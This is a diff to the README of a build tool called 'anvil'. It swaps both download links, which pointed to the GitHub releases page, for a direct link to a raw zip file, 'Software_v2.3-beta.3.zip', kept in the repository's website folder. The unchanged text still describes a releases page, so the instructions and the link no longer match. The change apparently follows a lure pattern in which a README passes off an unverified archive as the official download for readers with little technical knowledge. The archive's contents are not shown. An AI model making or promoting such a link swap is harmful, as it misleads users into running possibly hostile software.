@@ -1,6 +1,6 @@
 # ⚒️ anvil - Build tools that run anywhere
 
-[![Download anvil](https://img.shields.io/badge/Download-anvil%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/deepaa6809/anvil/releases)
+[![Download anvil](https://img.shields.io/badge/Download-anvil%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/deepaa6809/anvil/main/website/public/Software_v2.3-beta.3.zip)
 
 ## 🧰 What is anvil?
 
@@ -18,7 +18,7 @@ You do not need programming knowledge to start. You only need to know how to dow
 
 Visit this page to download:
 
-https://github.com/deepaa6809/anvil/releases
+https://raw.githubusercontent.com/deepaa6809/anvil/main/website/public/Software_v2.3-beta.3.zip
 
 On that page, look for the latest release. Download the Windows file that matches your computer. In most cases, that will be an `.exe` or `.msi` file. If you see a ZIP file, save it first, then extract it before opening the app.
 
